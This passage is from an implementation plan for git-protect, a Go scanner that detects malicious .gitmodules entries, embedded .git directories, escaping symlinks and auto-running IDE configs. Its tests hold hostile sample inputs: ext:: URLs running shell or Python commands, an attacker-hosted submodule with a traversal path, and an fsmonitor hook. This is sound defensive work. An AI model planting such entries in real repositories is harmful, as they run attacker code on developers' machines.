		{"ext with space command", "ext::sh -c 'attack'"},
		{"ext with long command", "ext::python3 -c 'import socket; s=socket.socket()'"},
	}
	for _, tt := range urls {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			repo := makeRepo(t)
			content := fmt.Sprintf(
				"[submodule \"test\"]\n\tpath = vendor/test\n\turl = %s\n", tt.url)
			writeFile(t, filepath.Join(repo, ".gitmodules"), content)
			findings := submoduleScan(t, repo)
			if len(findings) == 0 {
				t.Errorf("expected finding for ext:: URL %q, got 0", tt.url)
			}
		})
	}
}

func TestSubmodulesScanner_PathWithDotDotMidPath(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".gitmodules"), `[submodule "mid-traversal"]
	path = vendor/../../../attack
	url = https://github.com/attacker/payload.git
`)
	findings := submoduleScan(t, repo)
	if len(findings) == 0 {
		t.Error("expected finding for mid-path traversal (vendor/../../../attack)")
	}
}

func TestSubmodulesScanner_GitmodulesIsDirectory_NoError(t *testing.T) {
	repo := makeRepo(t)
	// .gitmodules as a directory must not panic or error.
	if err := os.MkdirAll(filepath.Join(repo, ".gitmodules"), 0o755); err != nil {
		t.Fatalf("setup: %v", err)
	}
	m := scanner.NewSubmodulesModule()
	_, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("scanner must not error when .gitmodules is a directory: %v", err)
	}
}

func TestSubmodulesScanner_ModuleName(t *testing.T) {
	m := scanner.NewSubmodulesModule()
	if m.Name() != "submodules" {
		t.Errorf("Name() = %q, want %q", m.Name(), "submodules")
	}
}
```

### Step 2 — Run test (expect FAIL)

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestSubmodulesScanner -v 2>&1 | head -10
```

Expected output:
```
./internal/scanner/submodules_test.go:13:12: undefined: scanner.NewSubmodulesModule
FAIL    github.com/moldabekov/git-protect/internal/scanner [build failed]
```

### Step 3 — Write the implementation

**File: `internal/scanner/submodules.go`**

```go
package scanner

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// submodulesModule scans .gitmodules for URLs and paths that enable code
// execution or path traversal.
//
// Detected patterns:
//   - ext:: URLs: git's "external protocol" transport passes the remainder of
//     the URL directly to a shell, enabling arbitrary command execution on fetch.
//   - Path traversal (../): submodule paths that escape the repository root.
//   - Carriage-return smuggling: \r in a path causes git to write to a different
//     location than displayed (CVE-2025-48384).
type submodulesModule struct{}

// NewSubmodulesModule returns a Module that detects malicious .gitmodules entries.
func NewSubmodulesModule() Module {
	return &submodulesModule{}
}

func (s *submodulesModule) Name() string { return "submodules" }

func (s *submodulesModule) Scan(_ context.Context, sc ScanContext) ([]Finding, error) {
	gmPath := filepath.Join(sc.RepoPath, ".gitmodules")

	info, err := os.Stat(gmPath)
	if err != nil {
		if os.IsNotExist(err) {
			return nil, nil
		}
		return nil, fmt.Errorf("submodules: stat %s: %w", gmPath, err)
	}
	if info.IsDir() {
		return nil, nil
	}

	f, err := os.Open(gmPath)
	if err != nil {
		return nil, fmt.Errorf("submodules: open %s: %w", gmPath, err)
	}
	defer f.Close()

	return parseGitmodules(f, ".gitmodules")
}

// submoduleEntry holds parsed data for one [submodule "name"] block.
type submoduleEntry struct {
	name string
	path string
	url  string
}

// parseGitmodules parses the INI-format .gitmodules file and returns findings.
func parseGitmodules(f interface {
	Read([]byte) (int, error)
}, relPath string) ([]Finding, error) {
	sc := bufio.NewScanner(f.(interface{ Read([]byte) (int, error) }).(interface {
		Read([]byte) (int, error)
	}))
	var findings []Finding
	var current *submoduleEntry

	flush := func() {
		if current == nil {
			return
		}
		findings = append(findings, checkSubmodule(current, relPath)...)
		current = nil
	}

	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || line[0] == '#' || line[0] == ';' {
			continue
		}
		if line[0] == '[' {
			flush()
			lower := strings.ToLower(line)
			if strings.HasPrefix(lower, "[submodule ") {
				name := extractSubsection(lower)
				current = &submoduleEntry{name: name}
			}
			continue
		}
		if current == nil {
			continue
		}
		eq := strings.IndexByte(line, '=')
		if eq < 0 {
			continue
		}
		key := strings.ToLower(strings.TrimSpace(line[:eq]))
		val := strings.TrimSpace(line[eq+1:])
		val = stripInlineComment(val)
		switch key {
		case "path":
			current.path = val
		case "url":
			current.url = val
		}
	}
	flush()
	return findings, sc.Err()
}

// checkSubmodule inspects one submodule entry and returns any findings.
func checkSubmodule(e *submoduleEntry, relPath string) []Finding {
	var findings []Finding

	// 1. ext:: protocol URL — arbitrary shell command execution.
	if strings.HasPrefix(e.url, "ext::") {
		findings = append(findings, Finding{
			Severity: Critical,
			Module:   "submodules",
			Path:     relPath,
			Message: fmt.Sprintf("ext:: URL in submodule %q: %s",
				e.name, truncate(e.url, 120)),
			Detail: "The ext:: transport passes the URL remainder to a shell command " +
				"via git-remote-ext. Cloning this submodule executes arbitrary " +
				"attacker-controlled code.",
		})
	}

	// 2. Path traversal in submodule path.
	if strings.Contains(e.path, "../") || strings.HasPrefix(e.path, "..") {
		findings = append(findings, Finding{
			Severity: Critical,
			Module:   "submodules",
			Path:     relPath,
			Message: fmt.Sprintf("path traversal in submodule %q path: %q",
				e.name, e.path),
			Detail: "A submodule path containing ../ can escape the repository root " +
				"and write files to arbitrary locations on the filesystem.",
		})
	}

	// 3. Carriage-return smuggling (CVE-2025-48384).
	if strings.ContainsRune(e.path, '\r') {
		findings = append(findings, Finding{
			Severity: Critical,
			Module:   "submodules",
			Path:     relPath,
			Message: fmt.Sprintf(
				"carriage-return (\\r) in submodule %q path (CVE-2025-48384)",
				e.name),
			Detail: "A carriage return in the submodule path causes git to write " +
				"checkout data to a location different from what it displays. " +
				"This can overwrite arbitrary files including git hooks.",
		})
	}

	return findings
}

// truncate returns s truncated to at most maxLen runes.
func truncate(s string, maxLen int) string {
	runes := []rune(s)
	if len(runes) <= maxLen {
		return s
	}
	return string(runes[:maxLen]) + "..."
}
```

> Implementation note: the `parseGitmodules` function signature uses a
> `interface{ Read([]byte) (int, error) }` parameter so it can accept `*os.File`
> (or any `io.Reader`) without importing `io`. However the double type assertion
> in the scanner body is verbose. Prefer importing `io` and using `io.Reader`:

**File: `internal/scanner/submodules.go`** (clean version — use io.Reader)

```go
package scanner

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
)

// submodulesModule scans .gitmodules for URLs and paths that enable code
// execution or path traversal.
type submodulesModule struct{}

// NewSubmodulesModule returns a Module that detects malicious .gitmodules entries.
func NewSubmodulesModule() Module {
	return &submodulesModule{}
}

func (s *submodulesModule) Name() string { return "submodules" }

func (s *submodulesModule) Scan(_ context.Context, sc ScanContext) ([]Finding, error) {
	gmPath := filepath.Join(sc.RepoPath, ".gitmodules")

	info, err := os.Stat(gmPath)
	if err != nil {
		if os.IsNotExist(err) {
			return nil, nil
		}
		return nil, fmt.Errorf("submodules: stat %s: %w", gmPath, err)
	}
	if info.IsDir() {
		return nil, nil
	}

	f, err := os.Open(gmPath)
	if err != nil {
		return nil, fmt.Errorf("submodules: open %s: %w", gmPath, err)
	}
	defer f.Close()

	return parseGitmodules(f, ".gitmodules")
}

// submoduleEntry holds parsed data for one [submodule "name"] block.
type submoduleEntry struct {
	name string
	path string
	url  string
}

// parseGitmodules parses the INI-format .gitmodules file and returns findings.
func parseGitmodules(r io.Reader, relPath string) ([]Finding, error) {
	sc := bufio.NewScanner(r)
	var findings []Finding
	var current *submoduleEntry

	flush := func() {
		if current == nil {
			return
		}
		findings = append(findings, checkSubmodule(current, relPath)...)
		current = nil
	}

	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || line[0] == '#' || line[0] == ';' {
			continue
		}
		if line[0] == '[' {
			flush()
			lower := strings.ToLower(line)
			if strings.HasPrefix(lower, "[submodule ") {
				name := extractSubsection(lower)
				current = &submoduleEntry{name: name}
			}
			continue
		}
		if current == nil {
			continue
		}
		eq := strings.IndexByte(line, '=')
		if eq < 0 {
			continue
		}
		key := strings.ToLower(strings.TrimSpace(line[:eq]))
		val := strings.TrimSpace(line[eq+1:])
		val = stripInlineComment(val)
		switch key {
		case "path":
			current.path = val
		case "url":
			current.url = val
		}
	}
	flush()
	return findings, sc.Err()
}

// checkSubmodule inspects one submodule entry and returns any findings.
func checkSubmodule(e *submoduleEntry, relPath string) []Finding {
	var findings []Finding

	// 1. ext:: protocol URL — arbitrary shell command execution via git-remote-ext.
	if strings.HasPrefix(e.url, "ext::") {
		findings = append(findings, Finding{
			Severity: Critical,
			Module:   "submodules",
			Path:     relPath,
			Message: fmt.Sprintf("ext:: URL in submodule %q: %s",
				e.name, truncate(e.url, 120)),
			Detail: "The ext:: transport passes the URL remainder to a shell command " +
				"via git-remote-ext. Cloning this submodule executes arbitrary " +
				"attacker-controlled code.",
		})
	}

	// 2. Path traversal in submodule path.
	if strings.Contains(e.path, "../") || strings.HasPrefix(e.path, "..") {
		findings = append(findings, Finding{
			Severity: Critical,
			Module:   "submodules",
			Path:     relPath,
			Message: fmt.Sprintf("path traversal in submodule %q path: %q",
				e.name, e.path),
			Detail: "A submodule path containing ../ can escape the repository root " +
				"and write files to arbitrary locations on the filesystem.",
		})
	}

	// 3. Carriage-return smuggling (CVE-2025-48384).
	if strings.ContainsRune(e.path, '\r') {
		findings = append(findings, Finding{
			Severity: Critical,
			Module:   "submodules",
			Path:     relPath,
			Message: fmt.Sprintf(
				"carriage-return (\\r) in submodule %q path (CVE-2025-48384)",
				e.name),
			Detail: "A carriage return in the submodule path causes git to write " +
				"checkout data to a location different from what it displays. " +
				"This can overwrite arbitrary files including git hooks.",
		})
	}

	return findings
}

// truncate returns s truncated to at most maxLen runes.
func truncate(s string, maxLen int) string {
	runes := []rune(s)
	if len(runes) <= maxLen {
		return s
	}
	return string(runes[:maxLen]) + "..."
}
```

> The `parseGitConfig` function in `config.go` also needs to use `io.Reader`
> instead of the custom interface. Update its signature to:
> `func parseGitConfig(r io.Reader) ([]configEntry, error)` and add `"io"` to
> the imports. The call site in `config.go`'s `Scan` method passes `f` which is
> `*os.File`, satisfying `io.Reader`.

### Step 4 — Run test (expect PASS)

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestSubmodulesScanner -v
```

Expected output:
```
=== RUN   TestSubmodulesScanner_NoGitmodules
--- PASS: TestSubmodulesScanner_NoGitmodules (0.00s)
=== RUN   TestSubmodulesScanner_CleanGitmodules
--- PASS: TestSubmodulesScanner_CleanGitmodules (0.00s)
=== RUN   TestSubmodulesScanner_ExtProtocol_IsCritical
--- PASS: TestSubmodulesScanner_ExtProtocol_IsCritical (0.00s)
=== RUN   TestSubmodulesScanner_PathTraversal_IsCritical
--- PASS: TestSubmodulesScanner_PathTraversal_IsCritical (0.00s)
=== RUN   TestSubmodulesScanner_CarriageReturnInPath_IsCritical
--- PASS: TestSubmodulesScanner_CarriageReturnInPath_IsCritical (0.00s)
=== RUN   TestSubmodulesScanner_MultipleAttacks_AllReported
--- PASS: TestSubmodulesScanner_MultipleAttacks_AllReported (0.00s)
=== RUN   TestSubmodulesScanner_ExtProtocol_VariousFormats
=== RUN   TestSubmodulesScanner_ExtProtocol_VariousFormats/ext_double_colon_plain
--- PASS: TestSubmodulesScanner_ExtProtocol_VariousFormats/ext_double_colon_plain (0.00s)
=== RUN   TestSubmodulesScanner_ExtProtocol_VariousFormats/ext_with_space_command
--- PASS: TestSubmodulesScanner_ExtProtocol_VariousFormats/ext_with_space_command (0.00s)
=== RUN   TestSubmodulesScanner_ExtProtocol_VariousFormats/ext_with_long_command
--- PASS: TestSubmodulesScanner_ExtProtocol_VariousFormats/ext_with_long_command (0.00s)
=== RUN   TestSubmodulesScanner_PathWithDotDotMidPath
--- PASS: TestSubmodulesScanner_PathWithDotDotMidPath (0.00s)
=== RUN   TestSubmodulesScanner_GitmodulesIsDirectory_NoError
--- PASS: TestSubmodulesScanner_GitmodulesIsDirectory_NoError (0.00s)
=== RUN   TestSubmodulesScanner_ModuleName
--- PASS: TestSubmodulesScanner_ModuleName (0.00s)
PASS
```

### Step 5 — Commit

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
git add internal/scanner/submodules.go internal/scanner/submodules_test.go
git commit -m "feat: submodules scanner -- detect ext:: URLs, path traversal, CR smuggling in .gitmodules (CRITICAL)"
```

---

## Task 9: Bare-Repos Scanner

### Files
- `internal/scanner/barerepos_test.go`
- `internal/scanner/barerepos.go`

---

### Step 1 — Write the test

**File: `internal/scanner/barerepos_test.go`**

```go
package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

func bareRepoScan(t *testing.T, repo string) []scanner.Finding {
	t.Helper()
	m := scanner.NewBareReposModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("bare-repos scan error: %v", err)
	}
	return findings
}

func TestBareRepos_CleanRepo_NoFindings(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, "src", "main.go"), "package main\n")
	writeFile(t, filepath.Join(repo, "docs", "README.md"), "# Project\n")
	findings := bareRepoScan(t, repo)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings in clean repo, got %d: %v", len(findings), findings)
	}
}

func TestBareRepos_RootGitDir_NotFlagged(t *testing.T) {
	repo := makeRepo(t)
	findings := bareRepoScan(t, repo)
	if len(findings) != 0 {
		t.Errorf("root .git/ must not be flagged, got %d findings", len(findings))
	}
}

func TestBareRepos_EmbeddedGitDir_IsCritical(t *testing.T) {
	repo := makeRepo(t)
	embeddedGit := filepath.Join(repo, "vendor", "malicious", ".git")
	if err := os.MkdirAll(embeddedGit, 0o755); err != nil {
		t.Fatalf("setup: %v", err)
	}
	writeFile(t, filepath.Join(embeddedGit, "config"), `[core]
	fsmonitor = /tmp/attack
`)
	findings := bareRepoScan(t, repo)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d: %v", len(findings), findings)
	}
	f := findings[0]
	if f.Severity != scanner.Critical {
		t.Errorf("severity = %v, want CRITICAL", f.Severity)
	}
	if f.Module != "bare-repos" {
		t.Errorf("module = %q, want %q", f.Module, "bare-repos")
	}
	if !strings.Contains(f.Path, filepath.Join("vendor", "malicious", ".git")) {
		t.Errorf("path %q should reference the embedded .git path", f.Path)
	}
}

func TestBareRepos_EmbeddedGitDir_DeepNesting(t *testing.T) {
	repo := makeRepo(t)
	deepGit := filepath.Join(repo, "a", "b", "c", "d", "e", ".git")
	if err := os.MkdirAll(deepGit, 0o755); err != nil {
		t.Fatalf("setup: %v", err)
	}
	findings := bareRepoScan(t, repo)
	if len(findings) != 1 {
		t.Errorf("expected 1 finding for deeply nested .git/, got %d", len(findings))
	}
}

func TestBareRepos_MultipleEmbeddedGitDirs(t *testing.T) {
	repo := makeRepo(t)
	for _, sub := range []string{"vendor/a", "vendor/b", "subprojects/c"} {
		dir := filepath.Join(repo, sub, ".git")
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatalf("setup %s: %v", dir, err)
		}
	}
	findings := bareRepoScan(t, repo)
	if len(findings) != 3 {
		t.Errorf("expected 3 findings, got %d: %v", len(findings), findings)
	}
	for _, f := range findings {
		if f.Severity != scanner.Critical {
			t.Errorf("finding %q: severity = %v, want CRITICAL", f.Path, f.Severity)
		}
	}
}

func TestBareRepos_CaseVariant_GIT_IsCritical(t *testing.T) {
	// On Linux (case-sensitive FS), .GIT/ is a different entry from .git/ and
	// git will treat it as an embedded bare repo.
	if runtime.GOOS == "windows" {
		t.Skip("Windows is case-insensitive: .GIT/ resolves to .git/")
	}
	repo := makeRepo(t)
	upperGit := filepath.Join(repo, "src", ".GIT")
	if err := os.MkdirAll(upperGit, 0o755); err != nil {
		t.Fatalf("setup: %v", err)
	}
	writeFile(t, filepath.Join(upperGit, "config"), "[core]\n\tfilemode = true\n")

	findings := bareRepoScan(t, repo)
	if len(findings) != 1 {
		t.Errorf("expected 1 finding for .GIT/ case variant, got %d: %v", len(findings), findings)
	}
	if findings[0].Severity != scanner.Critical {
		t.Errorf("severity = %v, want CRITICAL", findings[0].Severity)
	}
}

func TestBareRepos_CaseVariant_GitMixedCase(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Windows is case-insensitive")
	}
	repo := makeRepo(t)
	mixedGit := filepath.Join(repo, "subdir", ".Git")
	if err := os.MkdirAll(mixedGit, 0o755); err != nil {
		t.Fatalf("setup: %v", err)
	}
	findings := bareRepoScan(t, repo)
	if len(findings) != 1 {
		t.Errorf("expected 1 finding for .Git/ mixed case, got %d: %v", len(findings), findings)
	}
}

func TestBareRepos_DotGitFile_NotFlagged(t *testing.T) {
	// A .git FILE (not directory) is how git worktrees reference their parent.
	// It is not an embedded bare repo.
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, "subdir", ".git"),
		"gitdir: ../../.git/worktrees/sub\n")
	findings := bareRepoScan(t, repo)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for .git file (worktree ref), got %d", len(findings))
	}
}

func TestBareRepos_ModuleName(t *testing.T) {
	m := scanner.NewBareReposModule()
	if m.Name() != "bare-repos" {
		t.Errorf("Name() = %q, want %q", m.Name(), "bare-repos")
	}
}
```

### Step 2 — Run test (expect FAIL)

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestBareRepos -v 2>&1 | head -10
```

Expected output:
```
./internal/scanner/barerepos_test.go:13:12: undefined: scanner.NewBareReposModule
FAIL    github.com/moldabekov/git-protect/internal/scanner [build failed]
```

### Step 3 — Write the implementation

**File: `internal/scanner/barerepos.go`**

```go
package scanner

import (
	"context"
	"fmt"
	"io/fs"
	"path/filepath"
	"strings"
)

// bareReposModule walks the repository working tree and flags any embedded .git/
// directories (including case variants: .GIT/, .Git/, etc.).
//
// An embedded bare repo is the primary attack surface for CVE-2024-32002:
// git parses the embedded .git/config when it enters that directory, allowing
// an attacker to inject core.fsmonitor or other command-execution directives.
//
// The root .git/ directory (the repo's own git storage) is excluded from results.
type bareReposModule struct{}

// NewBareReposModule returns a Module that detects embedded bare repositories.
func NewBareReposModule() Module {
	return &bareReposModule{}
}

func (b *bareReposModule) Name() string { return "bare-repos" }

func (b *bareReposModule) Scan(_ context.Context, sc ScanContext) ([]Finding, error) {
	// The root .git directory to exclude.
	rootGit := filepath.Join(sc.RepoPath, ".git")

	var findings []Finding
	err := filepath.WalkDir(sc.RepoPath, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return nil // skip unreadable entries
		}
		if !d.IsDir() {
			return nil
		}
		// Only care about directories whose name is a case variant of ".git".
		if !isGitDirName(d.Name()) {
			return nil
		}
		// Exclude the repository's own root .git directory.
		if path == rootGit {
			return filepath.SkipDir
		}
		// This is an embedded .git directory — flag it.
		relPath, relErr := filepath.Rel(sc.RepoPath, path)
		if relErr != nil {
			relPath = path
		}
		findings = append(findings, Finding{
			Severity: Critical,
			Module:   "bare-repos",
			Path:     relPath,
			Message:  fmt.Sprintf("embedded git directory %q found in working tree", relPath),
			Detail: "An embedded .git/ directory is a bare git repository. Git parses " +
				"its config file automatically during operations, allowing an attacker " +
				"to inject core.fsmonitor or other command-execution directives. " +
				"This is the primary attack surface for CVE-2024-32002.",
		})
		// Do not descend into the embedded .git/ itself.
		return filepath.SkipDir
	})
	if err != nil {
		return findings, fmt.Errorf("bare-repos: walk %s: %w", sc.RepoPath, err)
	}
	return findings, nil
}

// isGitDirName returns true if name is ".git" in any ASCII case combination
// (.git, .GIT, .Git, .gIt, etc.).
func isGitDirName(name string) bool {
	return strings.EqualFold(name, ".git")
}
```

### Step 4 — Run test (expect PASS)

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestBareRepos -v
```

Expected output:
```
=== RUN   TestBareRepos_CleanRepo_NoFindings
--- PASS: TestBareRepos_CleanRepo_NoFindings (0.00s)
=== RUN   TestBareRepos_RootGitDir_NotFlagged
--- PASS: TestBareRepos_RootGitDir_NotFlagged (0.00s)
=== RUN   TestBareRepos_EmbeddedGitDir_IsCritical
--- PASS: TestBareRepos_EmbeddedGitDir_IsCritical (0.00s)
=== RUN   TestBareRepos_EmbeddedGitDir_DeepNesting
--- PASS: TestBareRepos_EmbeddedGitDir_DeepNesting (0.00s)
=== RUN   TestBareRepos_MultipleEmbeddedGitDirs
--- PASS: TestBareRepos_MultipleEmbeddedGitDirs (0.00s)
=== RUN   TestBareRepos_CaseVariant_GIT_IsCritical
--- PASS: TestBareRepos_CaseVariant_GIT_IsCritical (0.00s)
=== RUN   TestBareRepos_CaseVariant_GitMixedCase
--- PASS: TestBareRepos_CaseVariant_GitMixedCase (0.00s)
=== RUN   TestBareRepos_DotGitFile_NotFlagged
--- PASS: TestBareRepos_DotGitFile_NotFlagged (0.00s)
=== RUN   TestBareRepos_ModuleName
--- PASS: TestBareRepos_ModuleName (0.00s)
PASS
```

### Step 5 — Commit

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
git add internal/scanner/barerepos.go internal/scanner/barerepos_test.go
git commit -m "feat: bare-repos scanner -- detect embedded .git/ directories with case-insensitive matching (CRITICAL)"
```

---

## Full Test Suite Verification

After all six tasks are committed, run the full scanner package test suite:

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/... -race -count=1 -v 2>&1 | tail -30
```

Expected final lines:
```
PASS
ok      github.com/moldabekov/git-protect/internal/scanner      0.XXXs
```

Coverage check (minimum 80%):

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/... -race -coverprofile=coverage.out
go tool cover -func=coverage.out | grep -E "(total|scanner)"
```

---

## Cross-File Dependencies

These functions are defined once and called from multiple files in the same package:

| Function | Defined in | Used in |
|---|---|---|
| `stripInlineComment` | `config.go` | `config.go`, `configinclude.go`, `submodules.go` |
| `extractSubsection` | `configinclude.go` | `configinclude.go`, `submodules.go` |
| `isDisabled` | `config.go` | `config.go` |
| `truncate` | `submodules.go` | `submodules.go` |
| `isGitDirName` | `barerepos.go` | `barerepos.go` |
| `builtinDrivers` | `attributes.go` | `attributes.go` |
| `attrDriverRe` | `attributes.go` | `attributes.go` |

The `parseGitConfig` function in `config.go` accepts `io.Reader`. The `parseGitmodules`
function in `submodules.go` also accepts `io.Reader`. Both require `"io"` in their
import blocks.

If the agent encounters a "declared and not used" or "redeclared in this block"
compile error, it is because a helper was defined in two files. Move it to the
file where it is most logically cohesive and remove the duplicate.
# git-protect: Tasks 10-14 — Detection Scanner Modules

Complete Go implementation for the remaining detection scanner modules: symlinks, IDE configs,
devenv, scripts, build-hooks, unicode, and CI pipelines.

Package: `scanner` in `github.com/moldabekov/git-protect/internal/scanner`

---

## Task 10: Symlinks Scanner

**Files:** `internal/scanner/symlinks.go`, `internal/scanner/symlinks_test.go`

Detects symlinks whose resolved target falls outside the repository root. Severity: HIGH.

### Step 1: Write the test file first

Create `internal/scanner/symlinks_test.go`:

```go
package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

func TestSymlinksModule_NoSymlinks(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "README.md"), []byte("hello"), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewSymlinksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("got %d findings, want 0", len(findings))
	}
}

func TestSymlinksModule_InternalSymlink(t *testing.T) {
	// A symlink that points to a file inside the repo is safe.
	dir := t.TempDir()
	target := filepath.Join(dir, "real.txt")
	if err := os.WriteFile(target, []byte("data"), 0644); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(dir, "link.txt")
	if err := os.Symlink(target, link); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewSymlinksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("internal symlink should not be flagged, got %d findings", len(findings))
	}
}

func TestSymlinksModule_EscapingSymlink(t *testing.T) {
	// A symlink pointing to the temp dir's parent escapes the repo tree.
	dir := t.TempDir()
	link := filepath.Join(dir, "escape")
	outsideTarget := filepath.Dir(dir)
	if err := os.Symlink(outsideTarget, link); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewSymlinksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Error("escaping symlink should produce a finding")
	}
	if findings[0].Severity != scanner.High {
		t.Errorf("escaping symlink severity = %v, want HIGH", findings[0].Severity)
	}
}

func TestSymlinksModule_BrokenSymlink(t *testing.T) {
	// A broken symlink with an outside target should not panic or error.
	dir := t.TempDir()
	link := filepath.Join(dir, "broken")
	if err := os.Symlink("/nonexistent/path/outside", link); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewSymlinksModule()
	// Should not return an error even for unresolvable symlinks.
	_, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("broken symlink must not cause Scan to error: %v", err)
	}
}

func TestSymlinksModule_Name(t *testing.T) {
	m := scanner.NewSymlinksModule()
	if m.Name() != "symlinks" {
		t.Errorf("Name() = %q, want %q", m.Name(), "symlinks")
	}
}
```

### Step 2: Run tests to verify they fail

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestSymlinks -v 2>&1 | head -20
```

Expected: compilation error — `NewSymlinksModule` not defined.

### Step 3: Implement the symlinks scanner

Create `internal/scanner/symlinks.go`:

```go
package scanner

import (
	"context"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
)

// SymlinksModule detects symlinks whose resolved target escapes the repository tree.
// Severity: HIGH — can expose sensitive host files when the repo is opened in an IDE
// or archive tool that follows symlinks transparently.
type SymlinksModule struct{}

// NewSymlinksModule returns a new SymlinksModule.
func NewSymlinksModule() *SymlinksModule {
	return &SymlinksModule{}
}

// Name returns the module identifier.
func (m *SymlinksModule) Name() string { return "symlinks" }

// Scan walks the repository tree and flags any symlink whose resolved absolute
// path does not begin with the repository root.
func (m *SymlinksModule) Scan(_ context.Context, sc ScanContext) ([]Finding, error) {
	repoRoot, err := filepath.EvalSymlinks(sc.RepoPath)
	if err != nil {
		// If we cannot resolve the repo root itself, fall back to the raw path.
		repoRoot = filepath.Clean(sc.RepoPath)
	}
	// Ensure the prefix ends with the OS separator so that a repo at /tmp/repo
	// does not accidentally match /tmp/repo-other.
	repoPrefix := repoRoot + string(filepath.Separator)

	var findings []Finding

	walkErr := filepath.WalkDir(sc.RepoPath, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			// Skip unreadable entries; don't abort the whole walk.
			return nil
		}

		// Skip the .git directory entirely — git manages its own internals.
		if d.IsDir() && d.Name() == ".git" {
			return filepath.SkipDir
		}

		// Only process symlinks.
		if d.Type()&fs.ModeSymlink == 0 {
			return nil
		}

		resolved, resolveErr := filepath.EvalSymlinks(path)
		if resolveErr != nil {
			// Broken symlink — read the raw link target and check it lexically.
			rawTarget, linkErr := os.Readlink(path)
			if linkErr != nil {
				return nil // Cannot inspect; skip.
			}

			// Make absolute for comparison.
			if !filepath.IsAbs(rawTarget) {
				rawTarget = filepath.Join(filepath.Dir(path), rawTarget)
			}
			rawTarget = filepath.Clean(rawTarget)

			if !isInsideRepo(rawTarget, repoRoot, repoPrefix) {
				relPath, _ := filepath.Rel(sc.RepoPath, path)
				findings = append(findings, Finding{
					Severity: High,
					Module:   m.Name(),
					Path:     relPath,
					Message:  fmt.Sprintf("symlink target escapes repository tree: %s", rawTarget),
					Detail:   "Broken symlink with target outside repo; could expose host files if target is later created.",
				})
			}
			return nil
		}

		if !isInsideRepo(resolved, repoRoot, repoPrefix) {
			relPath, _ := filepath.Rel(sc.RepoPath, path)
			findings = append(findings, Finding{
				Severity: High,
				Module:   m.Name(),
				Path:     relPath,
				Message:  fmt.Sprintf("symlink target escapes repository tree: %s -> %s", relPath, resolved),
				Detail:   "A symlink pointing outside the repo can expose host files when opened in IDEs or archive tools.",
			})
		}

		return nil
	})

	if walkErr != nil {
		return findings, fmt.Errorf("symlinks: walk error: %w", walkErr)
	}

	return findings, nil
}

// isInsideRepo reports whether target is the repo root itself or a path under it.
func isInsideRepo(target, repoRoot, repoPrefix string) bool {
	return target == repoRoot || strings.HasPrefix(target, repoPrefix)
}
```

### Step 4: Run tests to verify they pass

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestSymlinks -v
```

Expected: all PASS.

### Step 5: Commit

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
git add internal/scanner/symlinks.go internal/scanner/symlinks_test.go
git commit -m "feat: symlinks scanner -- detect symlinks escaping repo tree (HIGH severity)"
```

---

## Task 11: IDE Configs Scanner

**Files:** `internal/scanner/ideconfigs.go`, `internal/scanner/ideconfigs_test.go`

Detects IDE configuration files that auto-execute code on project open. Severity: HIGH.

Attack surfaces:
- `.vscode/tasks.json` with `"runOn": "folderOpen"` — task auto-runs when VS Code opens the folder
- `.vscode/settings.json` with dangerous keys (`git.path`, `python.pythonPath`, `terminal.integrated.shell.*`, `python.defaultInterpreterPath`, `eslint.nodePath`, `prettier.prettierPath`) — overrides interpreters/tools used by extensions
- `.idea/` workspace XML files containing a `RunManager` component — JetBrains auto-run configurations (actively used in Contagious Interview campaign 2025-2026)

### Step 1: Write the test file first

